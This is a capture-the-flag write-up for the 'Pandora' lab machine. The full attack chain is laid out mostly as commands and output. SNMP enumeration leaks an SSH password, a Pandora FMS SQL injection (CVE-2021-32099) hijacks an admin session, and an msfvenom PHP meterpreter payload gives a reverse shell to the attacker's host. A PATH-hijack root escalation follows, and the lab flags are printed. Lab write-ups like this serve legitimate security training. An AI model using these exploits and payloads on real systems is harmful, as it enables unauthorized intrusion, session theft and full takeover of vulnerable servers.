# Pandora

1. Nmap TCP and UDP port with script
````
# nmap -sS -p- pandora.htb -oG 10.10.11.136-sS
# nmap -sU -p- pandora.htb -oG 10.10.11.136-sU
````

````
# snmpwalk -v2c -c public 10.10.11.136:161 1.3.6.1.2.1.25.4.2.1 > 10.10.11.136-snmpwalk
````

~iso.3.6.1.2.1.25.4.2.1.5.864 = STRING: "-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'"~

~iso.3.6.1.2.1.25.4.2.1.5.1107 = STRING: "-u daniel -p HotelBabylon23"~

2. Login into remote server
````
# ssh daniel@10.10.11.136
````

3. Enumerates
````
daniel@pandora:~$ ss -nlpt
State          Recv-Q          Send-Q                   Local Address:Port                   Peer Address:Port         Process         
LISTEN         0               80                           127.0.0.1:3306                        0.0.0.0:*                            
LISTEN         0               4096                     127.0.0.53%lo:53                          0.0.0.0:*                            
LISTEN         0               128                            0.0.0.0:22                          0.0.0.0:*                            
LISTEN         0               511                                  *:80                                *:*                            
LISTEN         0               128                               [::]:22                             [::]:*                            
daniel@pandora:~$ curl http://127.0.0.1:80
<meta HTTP-EQUIV="REFRESH" content="0; url=/pandora_console/">
````

4. Login redirecting the remote port
````
# ssh -L80:127.0.0.1:80 daniel@10.10.11.136
````

5. Enumarates
````
v7.0NG.742_FIX_PERL2020
````
- [CVE-2021-32099](https://nvd.nist.gov/vuln/detail/CVE-2021-32099)
- [CVE-2020-5844](https://nvd.nist.gov/vuln/detail/CVE-2020-5844)

## CVE-2021-32099
6. Test the target system with malformed input values'    "   `   %    %%   --   /*   //    )    ;
http://127.0.0.1/pandora_console/include/chart_generator.php?session_id=%27%20%20%20%20%22%20%20%20`%20%20%20%%20%20%20%20%%%20%20%20--%20%20%20/*%20%20%20//%20%20%20%20)%20%20%20%20;

````sql
SQL error: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use 
near '" ` % %% -- /* // ) ;' LIMIT 1' at line 1 ('SELECT * FROM tsessions_php WHERE `id_session` = '' " ` % %% -- /* // ) ;' LIMIT 1') in
/var/www/pandora/pandora_console/include/db/mysql.php on line 114
````

````sql
sqlmap -u '127.0.0.1/pandora_console/include/chart_generator.php?session_id=*' --dbms=MySQL --sql-shell
sql-shell> SELECT * FROM tsessions_php WHERE `id_session` = ''OR `data` LIKE '%id_usuario|s:5:"admin";%'
[*] id_usuario|s:5:"admin";alert_msg|a:0:{}new_chat|b:0;, gn7p2qba6310m05qn6iom3bvdf, 1642782084
[*] id_usuario|s:5:"admin";alert_msg|a:0:{}new_chat|b:0;, hj8tgic0fv8hmmb19b3j851af5, 1642779787
````

7. Access the URL
````sql
http://127.0.0.1/pandora_console/include/chart_generator.php?session_id=PAYLOAD'OR `data` LIKE '%id_usuario|s:5:"admin";%
````

and then your user will be logged
````
http://127.0.0.1/pandora_console/
````

## CVE-2020-5844

8. Create the payload then start multi handler

````bash
$ msfvenom -p php/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -o payload.php
$ msfconsole -qx "use exploit/multi/handler; set PAYLOAD php/meterpreter/reverse_tcp; set LPORT 4444; set LHOST tun0; exploit"
````

9. Upload the file to the vulnerable URL
````
http://127.0.0.1/pandora_console/index.php?sec=gextensions&sec2=godmode/setup/file_manager
````

10. Access it on your browser
````
http://127.0.0.1/pandora_console/images/payload.php
````

````bash
root@kali:~# msfconsole -qx "use exploit/multi/handler; set PAYLOAD php/meterpreter/reverse_tcp; set LPORT 4444; set LHOST tun0; exploit"
[*] Using configured payload generic/shell_reverse_tcp
PAYLOAD => php/meterpreter/reverse_tcp
LPORT => 4444
LHOST => tun0
[*] Started reverse TCP handler on 10.10.14.221:4444 
[*] Sending stage (39282 bytes) to 10.10.11.136
[*] Meterpreter session 1 opened (10.10.14.221:4444 -> 10.10.11.136:37560 ) at 2022-01-21 16:42:47 -0500

meterpreter > getuid 
Server username: matt
meterpreter > shell
cd /home/matt
ls
user.txt
cat user.txt
c06f3d03f86982c2cd7daa9fd244029f
````

11. Add your public key to matt's authorized_keys
- Then loggin through ssh 
- And execute the priv escalation

````bash
matt@pandora:/home/matt$ find / -perm -u=s 2> /dev/null
find / -perm -u=s 2> /dev/null
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/pandora_backup
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/at
/usr/bin/fusermount
/usr/bin/chsh
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1


matt@pandora:~$ cd /home/matt/
matt@pandora:~$ echo "/bin/bash" > tar
matt@pandora:~$ chmod +x tar
matt@pandora:~$ export PATH=/home/matt:$PATH
matt@pandora:~$ /usr/bin/pandora_backup
root@pandora:/root# cat root.txt 
4b0007bc3e164fba81e2052df250cd23
````

[OID repository](http://www.oid-info.com/get/1.3.6.1.2.1.25.4.2.1.5)

# Secrets
FLAG_USER = c06f3d03f86982c2cd7daa9fd244029f

FLAG_ROOT = 4b0007bc3e164fba81e2052df250cd23
